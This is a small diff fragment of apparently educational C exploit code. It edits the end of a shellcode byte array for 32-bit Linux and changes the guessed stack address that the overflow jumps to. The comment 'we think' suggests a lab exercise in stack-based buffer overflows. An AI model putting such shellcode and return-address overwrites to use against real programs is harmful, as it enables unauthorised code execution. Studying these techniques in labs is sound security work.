@@ -99,7 +99,7 @@ unsigned char payload[] =
 	"\xcd\x80"	/* int    $0x80		*/
 	/* ------------------------------------	*/
 	// Put the address of the buffer here (we think)
-	"\xf0\xb5\xff\xbf"
+	"\x10\xb6\xff\xbf"
 	;
 
 int
